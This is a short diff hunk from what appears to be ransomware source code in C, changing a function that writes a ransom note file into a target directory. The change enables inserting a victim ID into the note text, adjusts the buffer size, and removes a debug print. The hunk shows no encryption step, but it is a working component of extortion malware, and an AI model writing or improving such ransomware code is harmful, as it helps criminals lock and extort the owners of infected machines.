@@ -27,13 +27,14 @@ void writeRansomNote(char * directory,char * id)
     char * filename = calloc(1,sizeof(char) * (strlen(directory)+strlen("ransomnote.txt") +1));
     strcpy(filename,directory);
     strcat(filename,"ransomnote.txt");
+
     FILE * fp = fopen(filename,"w");
 
-    char * ransomnote = calloc(1,strlen(NOTE1)+strlen(NOTE2) +sizeof(id));
+    char * ransomnote = calloc(1,strlen(NOTE1)+strlen(NOTE2) +25);
     strcpy(ransomnote,NOTE1);
-   // strcat(ransomnote,id);
+    strcat(ransomnote,id);
     strcat(ransomnote,NOTE2);
-    printf("ransomnote: %s\n",ransomnote);
+
     fwrite(ransomnote,1,strlen(ransomnote),fp);
 
     free(filename);
